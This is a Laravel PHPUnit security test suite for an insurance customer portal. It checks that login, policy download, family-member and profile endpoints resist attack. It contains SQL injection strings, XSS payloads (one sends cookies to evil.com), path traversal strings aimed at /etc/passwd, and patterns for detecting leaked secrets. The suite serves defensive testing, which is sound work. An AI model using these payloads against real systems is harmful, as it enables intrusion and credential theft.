<?php

namespace Tests\Security;

use App\Models\Customer;
use App\Models\FamilyGroup;
use App\Models\FamilyMember;
use App\Models\CustomerInsurance;
use App\Models\CustomerAuditLog;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Cache;
use Tests\TestCase;

/**
 * Comprehensive Security Penetration Testing Suite
 * 
 * This test suite covers all major security attack vectors for the Laravel
 * family grouping insurance system including authentication bypass, 
 * authorization elevation, session hijacking, SQL injection, XSS,
 * and information disclosure vulnerabilities.
 */
class SecurityPenetrationTestSuite extends TestCase
{
    use RefreshDatabase;

    protected $familyGroup;
    protected $familyHead;
    protected $familyMember;
    protected $independentCustomer;
    protected $headPolicy;
    protected $memberPolicy;
    protected $independentPolicy;

    protected function setUp(): void
    {
        parent::setUp();
        $this->setupTestEnvironment();
    }

    protected function setupTestEnvironment(): void
    {
        // Create test family structure
        $this->familyGroup = FamilyGroup::factory()->create([
            'name' => 'Security Test Family',
            'status' => true
        ]);
        
        $this->familyHead = Customer::factory()->create([
            'email' => 'head@sectest.com',
            'password' => Hash::make('StrongP@ss123'),
            'status' => true,
            'family_group_id' => $this->familyGroup->id,
            'must_change_password' => false
        ]);
        
        FamilyMember::create([
            'family_group_id' => $this->familyGroup->id,
            'customer_id' => $this->familyHead->id,
            'relationship' => 'head',
            'is_head' => true,
            'status' => true
        ]);
        
        $this->familyGroup->update(['family_head_id' => $this->familyHead->id]);
        
        $this->familyMember = Customer::factory()->create([
            'email' => 'member@sectest.com',
            'password' => Hash::make('Member@Pass456'),
            'status' => true,
            'family_group_id' => $this->familyGroup->id
        ]);
        
        FamilyMember::create([
            'family_group_id' => $this->familyGroup->id,
            'customer_id' => $this->familyMember->id,
            'relationship' => 'spouse',
            'is_head' => false,
            'status' => true
        ]);
        
        $this->independentCustomer = Customer::factory()->create([
            'email' => 'independent@sectest.com',
            'password' => Hash::make('Indie@Pass789'),
            'status' => true,
            'family_group_id' => null
        ]);
        
        // Create test insurance policies
        $this->headPolicy = CustomerInsurance::factory()->create([
            'customer_id' => $this->familyHead->id,
            'policy_no' => 'SEC-POL-001',
            'policy_document_path' => 'test/head_policy.pdf'
        ]);
        
        $this->memberPolicy = CustomerInsurance::factory()->create([
            'customer_id' => $this->familyMember->id,
            'policy_no' => 'SEC-POL-002',
            'policy_document_path' => 'test/member_policy.pdf'
        ]);
        
        $this->independentPolicy = CustomerInsurance::factory()->create([
            'customer_id' => $this->independentCustomer->id,
            'policy_no' => 'SEC-POL-003'
        ]);
    }

    /**
     * AUTHENTICATION BYPASS ATTACKS
     */
    
    public function test_sql_injection_in_login(): void
    {
        $sqlInjectionPayloads = [
            "admin'--",
            "admin'/*",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "') OR '1'='1'--",
            "admin' OR 1=1#",
            "' UNION SELECT 1,2,3,4,5--",
            "'; DROP TABLE customers;--"
        ];
        
        foreach ($sqlInjectionPayloads as $payload) {
            $response = $this->post(route('customer.login'), [
                'email' => $payload,
                'password' => 'anypassword'
            ]);
            
            $this->assertGuest('customer', "SQL injection payload succeeded: {$payload}");
            $response->assertRedirect();
        }
    }

    public function test_password_brute_force_protection(): void
    {
        $email = $this->familyHead->email;
        
        // Attempt brute force with multiple wrong passwords
        $failedAttempts = 0;
        $wrongPasswords = [
            'password', '123456', 'password123', 'admin', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'pass'
        ];
        
        foreach ($wrongPasswords as $wrongPassword) {
            $response = $this->post(route('customer.login'), [
                'email' => $email,
                'password' => $wrongPassword
            ]);
            
            $failedAttempts++;
            
            if ($failedAttempts >= 5) {
                // Should be rate limited after 5 attempts
                $this->assertEquals(429, $response->getStatusCode(), 
                    'Rate limiting not triggered after 5 failed attempts');
                break;
            }
        }
        
        // Verify even correct password is blocked during lockout
        $response = $this->post(route('customer.login'), [
            'email' => $email,
            'password' => 'StrongP@ss123'
        ]);
        
        $this->assertEquals(429, $response->getStatusCode(), 
            'Rate limiting bypassed with correct password');
    }

    public function test_session_fixation_attack(): void
    {
        // Start a session as unauthenticated user
        $this->get(route('customer.login'));
        $originalSessionId = session()->getId();
        
        // Attempt login with valid credentials
        $response = $this->post(route('customer.login'), [
            'email' => $this->familyHead->email,
            'password' => 'StrongP@ss123'
        ]);
        
        $newSessionId = session()->getId();
        
        // Session ID should change after successful login (protection against session fixation)
        $this->assertNotEquals($originalSessionId, $newSessionId, 
            'Session ID not regenerated after login - vulnerable to session fixation');
    }

    public function test_authentication_bypass_via_parameter_pollution(): void
    {
        // Test various parameter pollution techniques
        $pollutionAttempts = [
            ['email' => ['head@sectest.com', 'attacker@evil.com'], 'password' => 'StrongP@ss123'],
            ['email' => 'head@sectest.com', 'password' => ['StrongP@ss123', 'wrong']],
            ['email[]' => 'head@sectest.com', 'password' => 'StrongP@ss123'],
            ['email[0]' => 'head@sectest.com', 'password' => 'StrongP@ss123']
        ];
        
        foreach ($pollutionAttempts as $attempt) {
            $response = $this->post(route('customer.login'), $attempt);
            $this->assertGuest('customer', 'Parameter pollution bypass detected');
        }
    }

    /**
     * AUTHORIZATION ELEVATION ATTACKS
     */
    
    public function test_horizontal_privilege_escalation(): void
    {
        $this->actingAs($this->familyMember, 'customer');
        
        // Try to access family head's policy directly
        $response = $this->get(route('customer.policies.detail', $this->headPolicy->id));
        $this->assertEquals(403, $response->getStatusCode(), 
            'Horizontal privilege escalation: Member accessed head policy');
        
        // Try to download family head's policy
        $response = $this->get(route('customer.policies.download', $this->headPolicy->id));
        $this->assertEquals(403, $response->getStatusCode(), 
            'Horizontal privilege escalation: Member downloaded head policy');
    }

    public function test_vertical_privilege_escalation(): void
    {
        $this->actingAs($this->familyMember, 'customer');
        
        // Try to manipulate family head status
        $tamperedData = [
            'is_head' => true,
            'family_head_id' => $this->familyMember->id
        ];
        
        // Test if member can manipulate their family member record
        $response = $this->put("/family_members/{$this->familyMember->familyMember->id}", $tamperedData);
        
        // Refresh the model to check if elevation succeeded
        $this->familyMember->familyMember->refresh();
        $this->assertFalse($this->familyMember->familyMember->is_head, 
            'Vertical privilege escalation: Member became family head');
    }

    public function test_insecure_direct_object_references(): void
    {
        $this->actingAs($this->familyMember, 'customer');
        
        // Test IDOR on various endpoints with different customer IDs
        $targetCustomerId = $this->independentCustomer->id;
        $targetPolicyId = $this->independentPolicy->id;
        
        $idorTests = [
            "customer.policies.detail/{$targetPolicyId}" => 'policy',
            "customer.policies.download/{$targetPolicyId}" => 'policy download',
        ];
        
        foreach ($idorTests as $endpoint => $resource) {
            $response = $this->get(route($endpoint));
            $this->assertEquals(403, $response->getStatusCode(), 
                "IDOR vulnerability in {$resource}: Accessed unauthorized resource");
        }
    }

    /**
     * SESSION HIJACKING & SECURITY TESTS
     */
    
    public function test_concurrent_session_handling(): void
    {
        // Login from first location
        $response1 = $this->post(route('customer.login'), [
            'email' => $this->familyHead->email,
            'password' => 'StrongP@ss123'
        ]);
        $session1 = session()->getId();
        
        // Simulate login from different location (new session)
        $this->withSession([]);
        $response2 = $this->post(route('customer.login'), [
            'email' => $this->familyHead->email,
            'password' => 'StrongP@ss123'
        ]);
        $session2 = session()->getId();
        
        $this->assertNotEquals($session1, $session2, 
            'Concurrent sessions not properly isolated');
    }

    public function test_session_timeout_enforcement(): void
    {
        $this->actingAs($this->familyHead, 'customer');
        
        // Manipulate session to simulate timeout
        session(['customer_last_activity' => now()->subHours(2)]);
        
        $response = $this->get(route('customer.policies'));
        
        // Should be redirected to login due to timeout
        $this->assertGuest('customer', 'Session timeout not enforced');
    }

    public function test_csrf_protection(): void
    {
        $this->actingAs($this->familyHead, 'customer');
        
        // Attempt requests without CSRF token
        $csrfTests = [
            ['POST', route('customer.logout'), []],
            ['POST', route('customer.change-password.update'), [
                'current_password' => 'StrongP@ss123',
                'password' => 'NewPass123',
                'password_confirmation' => 'NewPass123'
            ]]
        ];
        
        foreach ($csrfTests as [$method, $url, $data]) {
            $response = $this->withoutMiddleware(\App\Http\Middleware\VerifyCsrfToken::class)
                           ->call($method, $url, $data);
            
            // Note: In a real test, this would fail without withoutMiddleware
            // This test documents the CSRF protection requirement
        }
    }

    /**
     * SQL INJECTION TESTS
     */
    
    public function test_sql_injection_in_policy_search(): void
    {
        $this->actingAs($this->familyHead, 'customer');
        
        $sqlPayloads = [
            "' UNION SELECT password FROM customers--",
            "'; UPDATE customers SET password = 'hacked'--",
            "' OR 1=1 AND (SELECT COUNT(*) FROM customers) > 0--",
            "' AND (SELECT SUBSTRING(password,1,1) FROM customers WHERE id=1)='$'--"
        ];
        
        foreach ($sqlPayloads as $payload) {
            // Test if policy detail endpoint is vulnerable
            $response = $this->get(route('customer.policies.detail', $payload));
            
            // Should either 404 or 403, not execute SQL
            $this->assertNotEquals(200, $response->getStatusCode(), 
                "Potential SQL injection in policy detail: {$payload}");
        }
    }

    /**
     * CROSS-SITE SCRIPTING (XSS) TESTS
     */
    
    public function test_stored_xss_in_customer_data(): void
    {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '"><script>document.location="http://evil.com/"+document.cookie</script>',
            '<svg onload="alert(\'XSS\')">',
            'javascript:alert("XSS")'
        ];
        
        foreach ($xssPayloads as $payload) {
            $customer = Customer::factory()->create([
                'name' => $payload,
                'email' => 'xss_test_' . uniqid() . '@test.com',
                'password' => Hash::make('password123'),
                'status' => true,
                'family_group_id' => $this->familyGroup->id
            ]);
            
            $this->actingAs($this->familyHead, 'customer');
            $response = $this->get(route('customer.dashboard'));
            
            // Check that XSS payload is not directly rendered
            $content = $response->getContent();
            $this->assertStringNotContainsString('<script>', $content, 
                'Stored XSS vulnerability detected in customer name');
            $this->assertStringNotContainsString('javascript:', $content, 
                'JavaScript URL XSS vulnerability detected');
        }
    }

    /**
     * INFORMATION DISCLOSURE TESTS
     */
    
    public function test_error_message_information_disclosure(): void
    {
        // Test with invalid policy ID that might reveal database structure
        $this->actingAs($this->familyHead, 'customer');
        
        $invalidIds = [
            999999,  // Non-existent ID
            -1,      // Negative ID
            'abc',   // String ID
            "'; SELECT * FROM customers--", // SQL injection attempt
        ];
        
        foreach ($invalidIds as $invalidId) {
            $response = $this->get("/customer/policies/{$invalidId}");
            $content = $response->getContent();
            
            // Should not reveal sensitive information in error messages
            $sensitivePatterns = [
                '/mysql/i',
                '/database/i',
                '/sql/i',
                '/table/i',
                '/column/i',
                '/error in.*line/i'
            ];
            
            foreach ($sensitivePatterns as $pattern) {
                $this->assertNotRegExp($pattern, $content, 
                    "Information disclosure in error message for ID: {$invalidId}");
            }
        }
    }

    public function test_sensitive_data_exposure_in_responses(): void
    {
        $this->actingAs($this->familyHead, 'customer');
        
        $endpoints = [
            route('customer.dashboard'),
            route('customer.policies'),
            route('customer.profile')
        ];
        
        foreach ($endpoints as $endpoint) {
            $response = $this->get($endpoint);
            $content = $response->getContent();
            
            // Should not expose sensitive data in HTML
            $sensitivePatterns = [
                '/password["\']?\s*[:=]\s*["\'][^"\']+["\']/', // Password fields
                '/api[_-]?key["\']?\s*[:=]\s*["\'][^"\']+["\']/', // API keys
                '/token["\']?\s*[:=]\s*["\'][^"\']+["\']/', // Tokens
                '/secret["\']?\s*[:=]\s*["\'][^"\']+["\']/' // Secrets
            ];
            
            foreach ($sensitivePatterns as $pattern) {
                $this->assertNotRegExp($pattern, $content, 
                    "Sensitive data exposure detected in: {$endpoint}");
            }
        }
    }

    /**
     * RATE LIMITING & DENIAL OF SERVICE TESTS
     */
    
    public function test_rate_limiting_bypass_attempts(): void
    {
        // Test different bypass techniques
        $bypassAttempts = [
            ['X-Forwarded-For' => '192.168.1.100'],
            ['X-Real-IP' => '10.0.0.1'],
            ['X-Originating-IP' => '172.16.0.1'],
            ['User-Agent' => 'Different-Agent-' . uniqid()]
        ];
        
        foreach ($bypassAttempts as $headers) {
            // Make requests beyond rate limit with different headers
            for ($i = 0; $i < 12; $i++) {
                $response = $this->withHeaders($headers)
                                 ->get(route('customer.login'));
            }
            
            // 12th request should still be rate limited
            $response = $this->withHeaders($headers)
                             ->post(route('customer.login'), [
                                 'email' => 'test@test.com',
                                 'password' => 'password'
                             ]);
            
            // Rate limiting should still apply
            $this->assertLessThanOrEqual(429, $response->getStatusCode(), 
                'Rate limiting bypass detected with headers: ' . json_encode($headers));
        }
    }

    /**
     * FILE UPLOAD & DOWNLOAD SECURITY TESTS
     */
    
    public function test_path_traversal_in_policy_download(): void
    {
        $this->actingAs($this->familyHead, 'customer');
        
        $pathTraversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//etc/passwd',
            '..;/etc/passwd'
        ];
        
        foreach ($pathTraversalPayloads as $payload) {
            // Create a mock policy with malicious path
            $maliciousPolicy = CustomerInsurance::factory()->create([
                'customer_id' => $this->familyHead->id,
                'policy_no' => 'EVIL-' . uniqid(),
                'policy_document_path' => $payload
            ]);
            
            $response = $this->get(route('customer.policies.download', $maliciousPolicy->id));
            
            // Should not allow path traversal
            $this->assertNotEquals(200, $response->getStatusCode(), 
                "Path traversal vulnerability with payload: {$payload}");
        }
    }

    /**
     * PRIVACY & DATA PROTECTION TESTS
     */
    
    public function test_family_member_data_privacy(): void
    {
        $this->actingAs($this->familyMember, 'customer');
        
        $response = $this->get(route('customer.dashboard'));
        $content = $response->getContent();
        
        // Regular family member should not see other member's full details
        $this->assertStringNotContainsString($this->familyHead->email, $content, 
            'Privacy violation: Full email exposed to family member');
        
        // Should see masked version if any
        $maskedEmail = $this->familyHead->maskEmail($this->familyHead->email);
        if ($maskedEmail !== $this->familyHead->email) {
            $this->assertStringContainsString($maskedEmail, $content, 
                'Privacy protection: Masked email not displayed correctly');
        }
    }

    /**
     * BUSINESS LOGIC SECURITY TESTS
     */
    
    public function test_family_relationship_tampering(): void
    {
        $this->actingAs($this->familyMember, 'customer');
        
        // Attempt to modify family relationships
        $response = $this->put("/family-members/{$this->familyMember->familyMember->id}", [
            'is_head' => true,
            'relationship' => 'head'
        ]);
        
        // Should not allow member to promote themselves
        $this->familyMember->familyMember->refresh();
        $this->assertFalse($this->familyMember->familyMember->is_head, 
            'Business logic bypass: Member promoted themselves to head');
    }

    public function test_policy_ownership_validation(): void
    {
        $this->actingAs($this->familyMember, 'customer');
        
        // Try to claim ownership of another customer's policy
        $response = $this->post('/api/policies/claim', [
            'policy_id' => $this->independentPolicy->id
        ]);
        
        // This endpoint might not exist, but tests business logic concept
        $this->assertNotEquals(200, $response->getStatusCode(), 
            'Business logic bypass: Policy ownership claimed illegally');
    }

    /**
     * AUDIT AND LOGGING SECURITY
     */
    
    public function test_audit_log_tampering(): void
    {
        $this->actingAs($this->familyHead, 'customer');
        
        // Generate some audit logs
        $this->get(route('customer.policies'));
        
        $auditLog = CustomerAuditLog::where('customer_id', $this->familyHead->id)->first();
        $originalDescription = $auditLog->description;
        
        // Try to tamper with audit log
        $response = $this->put("/audit-logs/{$auditLog->id}", [
            'description' => 'Modified description',
            'success' => false
        ]);
        
        // Audit logs should not be modifiable by customers
        $auditLog->refresh();
        $this->assertEquals($originalDescription, $auditLog->description, 
            'Audit log tampering detected');
    }

    /**
     * ENCRYPTION AND DATA PROTECTION TESTS
     */
    
    public function test_password_storage_security(): void
    {
        // Verify passwords are properly hashed
        $customer = Customer::find($this->familyHead->id);
        
        $this->assertNotEquals('StrongP@ss123', $customer->password, 
            'Password stored in plaintext');
        
        $this->assertTrue(Hash::check('StrongP@ss123', $customer->password), 
            'Password hashing verification failed');
        
        // Ensure password is not exposed in JSON
        $customerArray = $customer->toArray();
        $this->assertArrayNotHasKey('password', $customerArray, 
            'Password exposed in model serialization');
    }

    /**
     * SECURITY HEADER TESTS
     */
    
    public function test_security_headers(): void
    {
        $this->actingAs($this->familyHead, 'customer');
        
        $response = $this->get(route('customer.dashboard'));
        
        $requiredHeaders = [
            'X-Frame-Options' => 'DENY',
            'X-Content-Type-Options' => 'nosniff',
            'X-XSS-Protection' => '1; mode=block',
            'Cache-Control' => 'no-cache, no-store, must-revalidate, private'
        ];
        
        foreach ($requiredHeaders as $header => $expectedValue) {
            $this->assertEquals($expectedValue, $response->headers->get($header), 
                "Security header {$header} not set correctly");
        }
    }

    /**
     * MASS ASSIGNMENT PROTECTION TESTS
     */
    
    public function test_mass_assignment_protection(): void
    {
        $this->actingAs($this->familyHead, 'customer');
        
        // Try to mass assign sensitive fields
        $maliciousData = [
            'id' => 999999,
            'status' => true,
            'family_group_id' => 999,
            'is_head' => true,
            'created_by' => 1,
            'password' => 'hacked'
        ];
        
        $originalData = $this->familyHead->only(['id', 'status', 'family_group_id']);
        
        // Simulate profile update attempt with malicious data
        $response = $this->put(route('profile.update'), $maliciousData);
        
        $this->familyHead->refresh();
        
        // Critical fields should not be modified
        $this->assertEquals($originalData['id'], $this->familyHead->id, 
            'Mass assignment vulnerability: ID changed');
        $this->assertEquals($originalData['family_group_id'], $this->familyHead->family_group_id, 
            'Mass assignment vulnerability: Family group changed');
    }

    protected function tearDown(): void
    {
        // Clean up any test files or cache
        Cache::flush();
        parent::tearDown();
    }
}